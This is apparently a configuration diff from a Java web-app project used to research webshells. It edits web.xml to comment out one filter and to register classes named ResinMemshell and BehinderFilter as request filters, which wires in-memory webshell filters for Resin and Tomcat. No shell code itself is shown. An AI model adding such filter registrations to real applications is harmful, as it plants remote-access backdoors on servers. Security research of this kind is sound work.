@@ -4,6 +4,7 @@
 
 <web-app>
   <display-name>Archetype Created Web Application</display-name>
+  <!--
   <filter>
     <filter-name>FilterXML</filter-name>
     <filter-class>com.sorry.bug.CustomFilter</filter-class>
@@ -12,6 +13,7 @@
     <filter-name>FilterXML</filter-name>
     <url-pattern>/customfilter</url-pattern>
   </filter-mapping>
+  -->
   <servlet>
     <servlet-name>ServletXML</servlet-name>
     <servlet-class>com.sorry.bug.CustomServlet</servlet-class>
@@ -22,7 +24,7 @@
   </servlet-mapping>
   <filter>
     <filter-name>FilterInjectResin38</filter-name>
-    <filter-class>com.sorry.bug.resin.Resin38Filter</filter-class>
+    <filter-class>com.sorry.bug.resin.ResinMemshell</filter-class>
   </filter>
   <filter-mapping>
     <filter-name>FilterInjectResin38</filter-name>
@@ -39,7 +41,7 @@
   <!-- tomcat -->
   <filter>
     <filter-name>filter_basic</filter-name>
-    <filter-class>com.sorry.bug.tomcat.Filter_basic</filter-class>
+    <filter-class>com.sorry.bug.tomcat.BehinderFilter</filter-class>
   </filter>
   <filter-mapping>
     <filter-name>filter_basic</filter-name>
